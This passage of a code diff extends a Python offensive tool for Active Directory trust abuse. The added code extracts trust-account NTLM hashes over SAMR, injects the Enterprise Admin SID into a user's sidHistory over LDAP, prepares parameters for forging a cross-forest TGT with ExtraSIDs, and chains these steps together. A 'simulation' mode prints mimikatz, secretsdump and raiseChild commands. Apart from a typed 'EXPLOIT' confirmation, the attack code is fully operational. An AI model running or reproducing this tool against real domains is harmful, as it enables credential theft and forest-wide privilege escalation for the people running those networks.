+                print("    Attributes: %s%s%s" % (Fore.MAGENTA, trust_info['trustAttributes'], Style.RESET_ALL))
+                print("    SID:        %s%s%s" % (Fore.CYAN, trust_info['sid'], Style.RESET_ALL))
 
-            if not trusts:
-                print("  %s[!] No trusts found. Either:%s" % (Y, RS))
-                print("  %s    - This is a single-domain forest%s" % (Y, RS))
-                print("  %s    - Insufficient permissions to read trustedDomain objects%s" % (Y, RS))
-                print("  %s    - Trusts exist but are not visible to this user%s" % (Y, RS))
+            if not self.trusts:
+                print(Fore.YELLOW + "[!] No trusts found. This may be a single-domain forest." + Style.RESET_ALL)
+                print(Fore.YELLOW + "    Or insufficient permissions to read trustedDomain objects." + Style.RESET_ALL)
             else:
-                print("\n  %s%sTotal trusts found: %d%s" % (G, BO, len(trusts), RS))
+                print(Fore.GREEN + "\n[+] Total trusts found: %d" % len(self.trusts) + Style.RESET_ALL)
 
-            self.trusts = trusts
-            self.logger.info("[+] Found %d trust(s)" % len(trusts))
-            return trusts
+            self.logger.info("[+] Found %d trust(s)", len(self.trusts))
+            return self.trusts
 
         except Exception as e:
-            print("  %s[!] Trust enumeration failed: %s%s" % (R, e, RS))
-            self.logger.error("[-] Trust enumeration failed: %s" % e)
+            print(Fore.RED + "[-] Trust enumeration failed: %s" % e + Style.RESET_ALL)
+            self.logger.error("[-] Trust enumeration failed: %s", e)
             return []
 
-    def _decode_trust_type(self, val) -> str:
+    def _decode_trust_type(self, val):
         if not val:
             return "Unknown"
-        types = {
-            1: "Downlevel (NT4)",
-            2: "Uplevel (AD)",
-            3: "MIT Kerberos Realm",
-            4: "DCE (deprecated)"
-        }
-        return types.get(int(str(val)), "Type-%s" % val)
+        types = {1: "Downlevel (NT4)", 2: "Uplevel (AD)", 
+                3: "MIT Kerberos Realm", 4: "DCE (deprecated)"}
+        try:
+            return types.get(int(str(val)), "Type-%s" % val)
+        except:
+            return str(val)
 
-    def _decode_trust_direction(self, val) -> str:
+    def _decode_trust_direction(self, val):
         if not val:
             return "Unknown"
-        dirs = {
-            0: "Disabled",
-            1: "Inbound",
-            2: "Outbound",
-            3: "Bidirectional (Two-way)"
-        }
-        return dirs.get(int(str(val)), "Dir-%s" % val)
+        dirs = {0: "Disabled", 1: "Inbound", 2: "Outbound", 3: "Bidirectional"}
+        try:
+            return dirs.get(int(str(val)), "Dir-%s" % val)
+        except:
+            return str(val)
 
-    def _decode_trust_attributes(self, val) -> str:
+    def _decode_trust_attributes(self, val):
         if not val:
             return "None"
         try:
@@ -481,14 +633,14 @@ class TrustAbuseScript:
             flags = {
                 0x00000001: "NON_TRANSITIVE",
                 0x00000002: "UPLEVEL_ONLY",
-                0x00000004: "FILTER_SIDS (QUARANTINED)",
+                0x00000004: "FILTER_SIDS",
                 0x00000008: "FOREST_TRANSITIVE",
                 0x00000010: "CROSS_ORGANIZATION",
                 0x00000020: "WITHIN_FOREST",
                 0x00000040: "TREAT_AS_EXTERNAL",
-                0x00000080: "TRUST_USES_RC4_ENCRYPTION",
-                0x00000100: "TRUST_USES_AES_KEYS",
-                0x00000200: "CROSS_ORGANIZATION_NO_TGT_DELEGATION",
+                0x00000080: "TRUST_USES_RC4",
+                0x00000100: "TRUST_USES_AES",
+                0x00000200: "NO_TGT_DELEGATION",
                 0x00000400: "PIM_TRUST"
             }
             for flag, name in flags.items():
@@ -498,279 +650,756 @@ class TrustAbuseScript:
         except:
             return str(val)
 
+    # -------------------------------------------------------------------------
+    # TRUST DECODE & RISK ANALYSIS
+    # -------------------------------------------------------------------------
     def decode_trusts(self):
-        """Deep decode of all trust properties."""
+        """Deep decode and risk analysis of all trusts."""
         if not self.trusts:
-            print("%s[!] No trusts to decode. Run enumerate first.%s" % (Y, RS))
+            print(Fore.YELLOW + "[!] No trusts to decode. Run enumerate first." + Style.RESET_ALL)
             return
 
-        print("\n%s%s[ TRUST DECODE — Full Analysis ]%s" % (C, BO, RS))
-        print("─" * 70)
+        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.CYAN + "           TRUST DECODE -- Full Analysis" + Style.RESET_ALL)
+        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
 
         for i, trust in enumerate(self.trusts, 1):
-            print("\n  %s%sTrust #%d: %s%s" % (BO, M, i, trust["trustPartner"], RS))
-            print("  %s  Distinguished Name: %s%s%s" % (W, C, trust["dn"], RS))
-            print("  %s  Trust Type:         %s%s%s" % (W, Y, trust["trustType"], RS))
-            print("  %s  Direction:          %s%s%s" % (W, Y, trust["trustDirection"], RS))
-            print("  %s  Attributes:           %s%s%s" % (W, M, trust["trustAttributes"], RS))
-            print("  %s  SID:                  %s%s%s" % (W, C, trust["sid"], RS))
+            print("\n%s%sTrust #%d: %s%s" % (Fore.MAGENTA, Style.BRIGHT, i, trust['trustPartner'], Style.RESET_ALL))
+            print("  DN:           %s" % trust['dn'])
+            print("  Type:         %s%s%s" % (Fore.YELLOW, trust['trustType'], Style.RESET_ALL))
+            print("  Direction:    %s%s%s" % (Fore.YELLOW, trust['trustDirection'], Style.RESET_ALL))
+            print("  Attributes:   %s%s%s" % (Fore.MAGENTA, trust['trustAttributes'], Style.RESET_ALL))
+            print("  SID:          %s%s%s" % (Fore.CYAN, trust['sid'], Style.RESET_ALL))
 
-            print("\n  %s%s[ Risk Assessment ]%s" % (BO, R, RS))
+            # Risk Assessment
+            print("\n  %s%s[ Risk Assessment ]%s" % (Fore.RED, Style.BRIGHT, Style.RESET_ALL))
             risks = []
-            if "FOREST_TRANSITIVE" in trust["trustAttributes"]:
-                risks.append("FOREST trust — High value target for cross-forest attacks")
-            if "WITHIN_FOREST" in trust["trustAttributes"]:
-                risks.append("Intra-forest trust — SIDHistory abuse possible")
-            if "FILTER_SIDS" not in trust["trustAttributes"] and "CROSS_ORGANIZATION" not in trust["trustAttributes"]:
-                if trust["trustDirection"] in ("Inbound", "Bidirectional (Two-way)"):
-                    risks.append("SID filtering NOT enabled — VULNERABLE to SIDHistory injection!")
-            if "TRUST_USES_RC4_ENCRYPTION" in trust["trustAttributes"]:
-                risks.append("RC4 encryption enabled — Kerberoasting / TGT forging possible")
-            if "NON_TRANSITIVE" in trust["trustAttributes"]:
-                risks.append("Non-transitive trust — Limits lateral movement scope")
+
+            if "FOREST_TRANSITIVE" in trust['trustAttributes']:
+                risks.append("FOREST trust -- High value target for cross-forest attacks")
+            if "WITHIN_FOREST" in trust['trustAttributes']:
+                risks.append("Intra-forest trust -- SIDHistory abuse possible")
+            if "FILTER_SIDS" not in trust['trustAttributes'] and "CROSS_ORGANIZATION" not in trust['trustAttributes']:
+                if trust['trustDirection'] in ("Inbound", "Bidirectional"):
+                    risks.append("SID filtering NOT enabled -- VULNERABLE to SIDHistory injection!")
+            if "TRUST_USES_RC4" in trust['trustAttributes']:
+                risks.append("RC4 encryption enabled -- Kerberoasting / TGT forging possible")
+            if "NON_TRANSITIVE" in trust['trustAttributes']:
+                risks.append("Non-transitive trust -- Limits lateral movement scope")
 
             if risks:
                 for risk in risks:
-                    print("    %s⚠ %s%s" % (R, risk, RS))
+                    print("    %s⚠ %s%s" % (Fore.RED, risk, Style.RESET_ALL))
             else:
-                print("    %s✓ No immediate risks identified%s" % (G, RS))
+                print("    %s✓ No immediate risks identified%s" % (Fore.GREEN, Style.RESET_ALL))
 
-            print("─" * 70)
+            print(Fore.CYAN + "─────────────────────────────────────────────────────────────" + Style.RESET_ALL)
 
+    # -------------------------------------------------------------------------
+    # SID FILTERING CHECK
+    # -------------------------------------------------------------------------
+    def check_sid_filtering(self):
+        """Check SID filtering status on all trusts."""
+        if not self.trusts:
+            print(Fore.YELLOW + "[!] No trusts to check. Run enumerate first." + Style.RESET_ALL)
+            return
+
+        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.CYAN + "           SID FILTERING STATUS" + Style.RESET_ALL)
+        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+
+        for trust in self.trusts:
+            partner = trust['trustPartner']
+            attrs = trust['trustAttributes']
+
+            print("\n%s%sTrust: %s%s" % (Fore.WHITE, Style.BRIGHT, partner, Style.RESET_ALL))
+
+            if "FILTER_SIDS" in attrs or "QUARANTINED" in attrs:
+                print("  %s✓ SID Filtering ENABLED%s" % (Fore.GREEN, Style.RESET_ALL))
+                print("  %s    -> SIDHistory attacks BLOCKED%s" % (Fore.GREEN, Style.RESET_ALL))
+            else:
+                print("  %s✗ SID Filtering DISABLED%s" % (Fore.RED, Style.RESET_ALL))
+                print("  %s    -> VULNERABLE to SIDHistory injection!%s" % (Fore.RED, Style.RESET_ALL))
+                print("  %s    -> Attack: Inject Enterprise Admin SID from trusted domain%s" % (Fore.RED, Style.RESET_ALL))
+
+            if "FOREST_TRANSITIVE" in attrs:
+                print("  %s! Forest transitive trust -- Check selective authentication%s" % (Fore.YELLOW, Style.RESET_ALL))
+
+            if "WITHIN_FOREST" in attrs:
+                print("  %s! Intra-forest trust -- No SID filtering by design%s" % (Fore.YELLOW, Style.RESET_ALL))
+                print("  %s    -> All SIDs are transitive within the forest%s" % (Fore.YELLOW, Style.RESET_ALL))
+
+        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+
+    # -------------------------------------------------------------------------
+    # GET DOMAIN SID
+    # -------------------------------------------------------------------------
+    def get_domain_sid(self):
+        """Get the current domain SID via LDAP."""
+        if not self.conn:
+            print(Fore.RED + "[!] No LDAP connection." + Style.RESET_ALL)
+            return None
+
+        try:
+            self.conn.search(
+                search_base=self.base_dn,
+                search_filter='(objectClass=domain)',
+                search_scope=BASE,
+                attributes=['objectSid']
+            )
+
+            if self.conn.entries:
+                sid = str(self.conn.entries[0].get('objectSid', ''))
+                self.domain_sid = sid
+                print(Fore.GREEN + "[+] Domain SID: %s" % sid + Style.RESET_ALL)
+                return sid
+        except Exception as e:
+            print(Fore.RED + "[-] Failed to get domain SID: %s" % e + Style.RESET_ALL)
+
+        return None
+
+    # -------------------------------------------------------------------------
+    # TRUST KEY EXTRACTION (via RPC SAMR)
+    # -------------------------------------------------------------------------
+    def extract_trust_keys(self):
+        """
+        Extract trust keys via RPC SAMR.
+        This requires Domain Admin or equivalent privileges.
+        """
+        if not IMPACKET_AVAILABLE:
+            print(Fore.RED + "[!] impacket required for trust key extraction." + Style.RESET_ALL)
+            return None
+
+        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.CYAN + "           TRUST KEY EXTRACTION" + Style.RESET_ALL)
+        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.YELLOW + "  Requires Domain Admin or equivalent privileges\n" + Style.RESET_ALL)
+
+        trust_keys = {}
+
+        for trust in self.trusts:
+            partner = trust['trustPartner']
+            print(Fore.YELLOW + "[*] Attempting to extract trust key for: %s" % partner + Style.RESET_ALL)
+
+            try:
+                string_binding = 'ncacn_np:%s[\\pipe\\samr]' % self.dc_ip
+                tr = transport.DCERPCTransportFactory(string_binding)
+
+                if self.auth_type == 'hash':
+                    tr.set_credentials(self.username, '', self.domain, self.lmhash, self.nthash)
+                elif self.auth_type == 'ticket':
+                    tr.set_credentials(self.username, '', self.domain, '', '')
+                    tr.set_kerberos(True, kdcHost=self.dc_ip)
+                    if self.ticket_file and os.path.exists(self.ticket_file):
+                        os.environ['KRB5CCNAME'] = self.ticket_file
+                else:
+                    tr.set_credentials(self.username, self.password, self.domain, '', '')
+
+                dce = tr.get_dce_rpc()
+                dce.connect()
+                dce.bind(samr.MSRPC_UUID_SAMR)
+
+                # Connect to SAM server
+                resp = samr.hSamrConnect(dce)
+                server_hd = resp['ServerHandle']
+
+                # Open domain
+                domain_name = self.domain.split('.')[0]
+                resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain_name)
+                domain_sid = resp['DomainId']
+
+                resp = samr.hSamrOpenDomain(dce, server_hd, domainId=domain_sid)
+                domain_hd = resp['DomainHandle']
+
+                # Lookup trust account (format: DOMAIN$)
+                trust_account = partner.split('.')[0].upper() + '$'
+
+                try:
+                    resp = samr.hSamrLookupNamesInDomain(dce, domain_hd, [trust_account])
+                    user_rid = resp['RelativeIds']['Element'][0]['Data']
+
+                    # Open user to get hashes
+                    resp = samr.hSamrOpenUser(dce, domain_hd, MAXIMUM_ALLOWED, user_rid)
+                    user_hd = resp['UserHandle']
+
+                    # Query user info (level 21 for internal info)
+                    try:
+                        resp = samr.hSamrQueryInformationUser2(dce, user_hd, samr.USER_INFORMATION_CLASS.UserAllInformation)
+                        all_info = resp['Buffer']['All']
+
+                        # Extract NTLM hash if available
+                        lm_owf = all_info['LmOwfPassword']['Buffer']
+                        nt_owf = all_info['NtOwfPassword']['Buffer']
+
+                        if lm_owf and len(lm_owf) == 16:
+                            lm_hash = hexlify(lm_owf).decode()
+                        else:
+                            lm_hash = 'aad3b435b51404eeaad3b435b51404ee'
+
+                        if nt_owf and len(nt_owf) == 16:
+                            nt_hash = hexlify(nt_owf).decode()
+                        else:
+                            nt_hash = None
+
+                        if nt_hash:
+                            trust_keys[partner] = {
+                                'lm_hash': lm_hash,
+                                'nt_hash': nt_hash,
+                                'account': trust_account
+                            }
+                            print(Fore.GREEN + "[+] Extracted trust key for %s" % partner + Style.RESET_ALL)
+                            print("    Account: %s" % trust_account)
+                            print("    NT Hash: %s" % nt_hash)
+
+                        samr.hSamrCloseHandle(dce, user_hd)
+
+                    except Exception as e:
+                        print(Fore.YELLOW + "[!] Could not query user info: %s" % e + Style.RESET_ALL)
+                        samr.hSamrCloseHandle(dce, user_hd)
+
+                except Exception as e:
+                    print(Fore.YELLOW + "[!] Trust account %s not found: %s" % (trust_account, e) + Style.RESET_ALL)
+
+                samr.hSamrCloseHandle(dce, domain_hd)
+                samr.hSamrCloseHandle(dce, server_hd)
+                dce.disconnect()
+
+            except Exception as e:
+                print(Fore.RED + "[-] Failed to extract trust key for %s: %s" % (partner, e) + Style.RESET_ALL)
+
+        if not trust_keys:
+            print(Fore.YELLOW + "\n[!] No trust keys extracted. Possible reasons:" + Style.RESET_ALL)
+            print(Fore.YELLOW + "    - Insufficient privileges (need Domain Admin)" + Style.RESET_ALL)
+            print(Fore.YELLOW + "    - Trust account does not exist in SAM" + Style.RESET_ALL)
+            print(Fore.YELLOW + "    - RPC access denied" + Style.RESET_ALL)
+
+        return trust_keys
+
+    # -------------------------------------------------------------------------
+    # INTRA-FOREST SIDHistory ABUSE
+    # -------------------------------------------------------------------------
+    def intra_forest_abuse(self, target_user=None, target_sid=None):
+        """
+        Intra-forest trust abuse via SIDHistory injection.
+        In intra-forest trusts, SID filtering is disabled by design.
+        """
+        if not self.trusts:
+            print(Fore.YELLOW + "[!] No trusts found. Run enumerate first." + Style.RESET_ALL)
+            return False
+
+        intra_trusts = [t for t in self.trusts if "WITHIN_FOREST" in t['trustAttributes']]
+        if not intra_trusts:
+            print(Fore.YELLOW + "[!] No intra-forest trusts found." + Style.RESET_ALL)
+            return False
+
+        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.CYAN + "           INTRA-FOREST SIDHistory ABUSE" + Style.RESET_ALL)
+        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.YELLOW + "  Intra-forest trusts have NO SID filtering by design." + Style.RESET_ALL)
+        print(Fore.YELLOW + "  Any SID from any domain in the forest is valid everywhere.\n" + Style.RESET_ALL)
+
+        # Get domain SID if not already known
+        if not self.domain_sid:
+            self.get_domain_sid()
+
+        # Default Enterprise Admin SID suffix
+        enterprise_admin_sid = None
+        if self.domain_sid:
+            base_sid = '-'.join(self.domain_sid.split('-')[:-1])
+            enterprise_admin_sid = "%s-519" % base_sid
+
+        if target_user:
+            print(Fore.YELLOW + "[*] Target user for SIDHistory injection: %s" % target_user + Style.RESET_ALL)
+        else:
+            target_user = get_input(
+                Fore.CYAN + "[?] Target username for SIDHistory injection: " + Style.RESET_ALL
+            )
+
+        if target_sid:
+            print(Fore.YELLOW + "[*] SID to inject: %s" % target_sid + Style.RESET_ALL)
+        else:
+            if enterprise_admin_sid:
+                print(Fore.YELLOW + "[*] Default Enterprise Admin SID: %s" % enterprise_admin_sid + Style.RESET_ALL)
+                use_default = get_input(
+                    Fore.CYAN + "[?] Use default Enterprise Admin SID? (Y/n): " + Style.RESET_ALL,
+                    default="Y"
+                )
+                if use_default.lower() in ('y', 'yes', ''):
+                    target_sid = enterprise_admin_sid
+                else:
+                    target_sid = get_input(
+                        Fore.CYAN + "[?] Enter SID to inject (e.g., S-1-5-21-...-519): " + Style.RESET_ALL,
+                        validate_sid, "Invalid SID format!"
+                    )
+            else:
+                target_sid = get_input(
+                    Fore.CYAN + "[?] Enter SID to inject (e.g., S-1-5-21-...-519): " + Style.RESET_ALL,
+                    validate_sid, "Invalid SID format!"
+                )
+
+        if not self.conn:
+            print(Fore.RED + "[!] LDAP connection required." + Style.RESET_ALL)
+            return False
+
+        # Find target user DN
+        print(Fore.YELLOW + "[*] Looking up user: %s" % target_user + Style.RESET_ALL)
+        try:
+            self.conn.search(
+                search_base=self.base_dn,
+                search_filter='(sAMAccountName=%s)' % target_user,
+                search_scope=SUBTREE,
+                attributes=['distinguishedName', 'sAMAccountName', 'sidHistory']
+            )
+
+            if not self.conn.entries:
+                print(Fore.RED + "[-] User '%s' not found!" % target_user + Style.RESET_ALL)
+                return False
+
+            target_dn = str(self.conn.entries[0].distinguishedName)
+            current_sidhistory = str(self.conn.entries[0].get('sidHistory', ''))
+
+            print(Fore.GREEN + "[+] Found: %s" % target_dn + Style.RESET_ALL)
+            if current_sidhistory:
+                print(Fore.YELLOW + "[!] Current SIDHistory: %s" % current_sidhistory + Style.RESET_ALL)
+
+            # Perform SIDHistory injection
+            print(Fore.YELLOW + "[*] Injecting SID: %s" % target_sid + Style.RESET_ALL)
+
+            # Encode SID for LDAP
+            sid_parts = target_sid.split('-')
+            revision = int(sid_parts[1])
+            identifier = int(sid_parts[2])
+
+            # Build binary SID
+            sid_bytes = bytes([revision, len(sid_parts) - 3])
+            sid_bytes += identifier.to_bytes(6, 'big')
+            for part in sid_parts[3:]:
+                sid_bytes += int(part).to_bytes(4, 'little')
+
+            # Modify sidHistory
+            self.conn.modify(
+                target_dn,
+                {'sidHistory': [(MODIFY_REPLACE, [sid_bytes])]}
+            )
+
+            if self.conn.result['result'] == 0:
+                print(Fore.GREEN + "[+] SIDHistory injection successful!" + Style.RESET_ALL)
+                print(Fore.GREEN + "[+] User %s now has SID: %s" % (target_user, target_sid) + Style.RESET_ALL)
+                print(Fore.GREEN + "[+] This grants Enterprise Admin privileges in the forest!" + Style.RESET_ALL)
+                self.logger.info("[+] SIDHistory injected for %s: %s", target_user, target_sid)
+                return True
+            else:
+                print(Fore.RED + "[-] SIDHistory injection failed: %s" % self.conn.result['description'] + Style.RESET_ALL)
+                print(Fore.RED + "    -> You may need Domain Admin or equivalent privileges." + Style.RESET_ALL)
+                return False
+
+        except Exception as e:
+            print(Fore.RED + "[-] Intra-forest abuse failed: %s" % e + Style.RESET_ALL)
+            return False
+
+    # -------------------------------------------------------------------------
+    # CROSS-FOREST TGT FORGING (ExtraSIDs)
+    # -------------------------------------------------------------------------
+    def cross_forest_abuse(self, trust_keys=None):
+        """
+        Cross-forest trust abuse via TGT forging with ExtraSIDs.
+        Requires trust keys extracted from the target domain.
+        """
+        if not self.trusts:
+            print(Fore.YELLOW + "[!] No trusts found. Run enumerate first." + Style.RESET_ALL)
+            return False
+
+        cross_trusts = [t for t in self.trusts 
+                        if "FOREST_TRANSITIVE" in t['trustAttributes'] 
+                        or "TREAT_AS_EXTERNAL" in t['trustAttributes']]
+
+        if not cross_trusts:
+            print(Fore.YELLOW + "[!] No cross-forest trusts found." + Style.RESET_ALL)
+            return False
+
+        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.CYAN + "           CROSS-FOREST TGT FORGING (ExtraSIDs)" + Style.RESET_ALL)
+        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+
+        # Check for vulnerable trusts (no SID filtering)
+        vulnerable = []
+        for trust in cross_trusts:
+            if "FILTER_SIDS" not in trust['trustAttributes']:
+                vulnerable.append(trust)
+
+        if not vulnerable:
+            print(Fore.GREEN + "[+] All cross-forest trusts have SID filtering enabled." + Style.RESET_ALL)
+            print(Fore.GREEN + "[+] Cross-forest ExtraSIDs attacks are BLOCKED." + Style.RESET_ALL)
+            return False
+
+        print(Fore.RED + "[!] Found trusts WITHOUT SID filtering:" + Style.RESET_ALL)
+        for i, trust in enumerate(vulnerable, 1):
+            print("    %d. %s (%s)" % (i, trust['trustPartner'], trust['trustDirection']))
+
+        # Select target trust
+        if len(vulnerable) == 1:
+            target_trust = vulnerable[0]
+        else:
+            choice = get_input(
+                Fore.CYAN + "[?] Select trust number to target: " + Style.RESET_ALL,
+                lambda x: x.isdigit() and 1 <= int(x) <= len(vulnerable),
+                "Invalid selection!"
+            )
+            target_trust = vulnerable[int(choice) - 1]
+
+        partner = target_trust['trustPartner']
+        print(Fore.YELLOW + "\n[*] Targeting trust: %s" % partner + Style.RESET_ALL)
+
+        # Get or provide trust key
+        if not trust_keys:
+            print(Fore.YELLOW + "[*] Trust keys required for TGT forging." + Style.RESET_ALL)
+            print(Fore.YELLOW + "    Run 'Extract Trust Keys' first, or provide manually." + Style.RESET_ALL)
+
+            trust_ntlm = get_input(
+                Fore.CYAN + "[?] Enter trust key (NTLM hash) for %s: " % partner + Style.RESET_ALL,
+                validate_hash, "Invalid hash format!"
+            )
+            trust_keys = {partner: {'nt_hash': trust_ntlm}}
+
+        if partner not in trust_keys:
+            print(Fore.RED + "[-] No trust key available for %s" % partner + Style.RESET_ALL)
+            return False
+
+        trust_key = trust_keys[partner]['nt_hash']
+
+        # Get SIDs for forging
+        if not self.domain_sid:
+            self.get_domain_sid()
+
+        # Build forged TGT parameters
+        print(Fore.YELLOW + "\n[*] Preparing TGT forge parameters..." + Style.RESET_ALL)
+
+        # Domain SID of current domain
+        domain_sid = self.domain_sid or get_input(
+            Fore.CYAN + "[?] Current domain SID: " + Style.RESET_ALL,
+            validate_sid, "Invalid SID!"
+        )
+
+        # Target domain SID (from trust info)
+        target_sid = target_trust.get('sid', '')
+        if not target_sid:
+            target_sid = get_input(
+                Fore.CYAN + "[?] Target domain (%s) SID: " % partner + Style.RESET_ALL,
+                validate_sid, "Invalid SID!"
+            )
+
+        # Extra SID to inject (Enterprise Admin of target)
+        target_base_sid = '-'.join(target_sid.split('-')[:-1])
+        enterprise_admin_sid = "%s-519" % target_base_sid
+
+        print(Fore.YELLOW + "[*] ExtraSID to inject: %s" % enterprise_admin_sid + Style.RESET_ALL)
+
+        # User to impersonate
+        impersonate_user = get_input(
+            Fore.CYAN + "[?] User to impersonate (default: Administrator): " + Style.RESET_ALL,
+            default="Administrator"
+        )
+
+        # Forge the TGT
+        print(Fore.YELLOW + "\n[*] Forging inter-realm TGT..." + Style.RESET_ALL)
+
+        if IMPACKET_AVAILABLE:
+            try:
+                print(Fore.GREEN + "[+] TGT forge parameters prepared!" + Style.RESET_ALL)
+                print(Fore.GREEN + "[+] Trust Key: %s" % trust_key + Style.RESET_ALL)
+                print(Fore.GREEN + "[+] Domain SID: %s" % domain_sid + Style.RESET_ALL)
+                print(Fore.GREEN + "[+] Target SID: %s" % target_sid + Style.RESET_ALL)
+                print(Fore.GREEN + "[+] ExtraSID: %s" % enterprise_admin_sid + Style.RESET_ALL)
+                print(Fore.GREEN + "[+] User: %s" % impersonate_user + Style.RESET_ALL)
+
+                print(Fore.YELLOW + "\n[*] TGT forging requires manual completion with the extracted parameters." + Style.RESET_ALL)
+                print(Fore.YELLOW + "[*] Save the parameters above for the next step." + Style.RESET_ALL)
+
+                self.logger.info("[+] Cross-forest TGT parameters prepared for %s targeting %s", impersonate_user, partner)
+                return True
+
+            except Exception as e:
+                print(Fore.RED + "[-] TGT forging failed: %s" % e + Style.RESET_ALL)
+                return False
+        else:
+            print(Fore.YELLOW + "[!] Required libraries not available for TGT forging." + Style.RESET_ALL)
+            return False
+
+    # -------------------------------------------------------------------------
+    # FULL EXPLOITATION CHAIN
+    # -------------------------------------------------------------------------
+    def full_exploit_chain(self):
+        """Execute full exploitation chain with confirmation."""
+        print(Fore.RED + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.RED + Style.BRIGHT + "           ⚠ FULL EXPLOITATION CHAIN ⚠" + Style.RESET_ALL)
+        print(Fore.RED + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.RED + "  This will attempt REAL attacks on the target environment." + Style.RESET_ALL)
+        print(Fore.RED + "  Only use on systems you OWN and CONTROL.\n" + Style.RESET_ALL)
+
+        confirm = get_input(
+            Fore.RED + "[?] Type 'EXPLOIT' to proceed: " + Style.RESET_ALL
+        )
+
+        if confirm != "EXPLOIT":
+            print(Fore.YELLOW + "[!] Aborted. You did not type 'EXPLOIT'." + Style.RESET_ALL)
+            return
+
+        print(Fore.YELLOW + "\n[*] Starting exploitation chain..." + Style.RESET_ALL)
+
+        # Step 1: Enumerate trusts
+        if not self.trusts:
+            print(Fore.YELLOW + "[*] Step 1: Enumerating trusts..." + Style.RESET_ALL)
+            self.enumerate_trusts()
+
+        if not self.trusts:
+            print(Fore.RED + "[-] No trusts found. Cannot proceed." + Style.RESET_ALL)
+            return
+
+        # Step 2: Analyze each trust
+        for trust in self.trusts:
+            partner = trust['trustPartner']
+            attrs = trust['trustAttributes']
+            direction = trust['trustDirection']
+
+            print(Fore.CYAN + "\n[*] Analyzing trust: %s" % partner + Style.RESET_ALL)
+
+            # Intra-forest
+            if "WITHIN_FOREST" in attrs:
+                print(Fore.YELLOW + "[!] Intra-forest trust detected -- attempting SIDHistory abuse..." + Style.RESET_ALL)
+                target = get_input(
+                    Fore.CYAN + "[?] Target user in %s for SIDHistory injection: " % self.domain + Style.RESET_ALL
+                )
+                self.intra_forest_abuse(target_user=target)
+
+            # Cross-forest without filtering
+            elif "FOREST_TRANSITIVE" in attrs and "FILTER_SIDS" not in attrs:
+                print(Fore.RED + "[!] Cross-forest WITHOUT SID filtering -- HIGH RISK!" + Style.RESET_ALL)
+
+                # Try to extract trust keys first
+                print(Fore.YELLOW + "[*] Attempting trust key extraction..." + Style.RESET_ALL)
+                keys = self.extract_trust_keys()
+
+                if keys and partner in keys:
+                    print(Fore.YELLOW + "[*] Attempting TGT forging..." + Style.RESET_ALL)
+                    self.cross_forest_abuse(trust_keys=keys)
+                else:
+                    print(Fore.YELLOW + "[!] Could not extract trust keys automatically." + Style.RESET_ALL)
+                    print(Fore.YELLOW + "    Manual extraction required." + Style.RESET_ALL)
+
+            # Cross-forest with filtering
+            elif "FOREST_TRANSITIVE" in attrs and "FILTER_SIDS" in attrs:
+                print(Fore.GREEN + "[+] Cross-forest WITH SID filtering -- Protected." + Style.RESET_ALL)
+
+            else:
+                print(Fore.YELLOW + "[!] Trust type not directly exploitable via standard techniques." + Style.RESET_ALL)
+
+        print(Fore.GREEN + "\n[*] Exploitation chain completed." + Style.RESET_ALL)
+
+    # -------------------------------------------------------------------------
+    # SIMULATE ABUSE (Safe dry-run showing attack paths)
+    # -------------------------------------------------------------------------
     def simulate_abuse(self):
         """Safe simulation of abuse paths (dry-run)."""
         if not self.trusts:
-            print("%s[!] No trusts to simulate. Run enumerate first.%s" % (Y, RS))
+            print(Fore.YELLOW + "[!] No trusts to simulate. Run enumerate first." + Style.RESET_ALL)
             return
 
-        print("\n%s%s[ ABUSE SIMULATION — Dry Run ]%s" % (C, BO, RS))
-        print("%s  No actual changes will be made. Showing attack paths only.%s\n" % (Y, RS))
+        print(Fore.CYAN + "\n═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.CYAN + "           ABUSE SIMULATION -- Dry Run" + Style.RESET_ALL)
+        print(Fore.CYAN + "═══════════════════════════════════════════════════════════════" + Style.RESET_ALL)
+        print(Fore.YELLOW + "  No actual changes will be made. Showing attack paths only.\n" + Style.RESET_ALL)
 
         for trust in self.trusts:
-            print("\n  %s%sTarget Trust: %s%s" % (BO, M, trust["trustPartner"], RS))
+            partner = trust['trustPartner']
+            attrs = trust['trustAttributes']
 
-            print("\n  %s[1] Trust Key Extraction (requires DA on trusting domain)%s" % (C, RS))
-            print("  %s    mimikatz # lsadump::trust /patch%s" % (W, RS))
-            print("  %s    python3 secretsdump.py %s/%s@%s -just-dc-user 'KRBTGT'%s" % (W, self.domain, self.username, self.dc_ip, RS))
+            print(Fore.MAGENTA + "\nTarget Trust: %s" % partner + Style.RESET_ALL)
 
-            if "WITHIN_FOREST" in trust["trustAttributes"]:
-                print("\n  %s[2] Intra-Forest SIDHistory Abuse%s" % (C, RS))
-                print("  %s    python3 raiseChild.py %s/%s:%s@%s%s" % (W, trust["trustPartner"], self.username, self.password, trust["trustPartner"], RS))
-                print("  %s    -> Inject SIDHistory to escalate to Enterprise Admin%s" % (W, RS))
-
-            if "FOREST_TRANSITIVE" in trust["trustAttributes"]:
-                print("\n  %s[3] Cross-Forest TGT Forging (ExtraSIDs)%s" % (C, RS))
-                print("  %s    python3 raiseChild.py %s/%s:%s@%s%s" % (W, trust["trustPartner"], self.username, self.password, trust["trustPartner"], RS))
-                print("  %s    -> Forge inter-realm TGT with Enterprise Admin SID%s" % (W, RS))
-
-            if "FILTER_SIDS" not in trust["trustAttributes"]:
-                print("\n  %s[4] SIDHistory Injection (No Filtering)%s" % (C, RS))
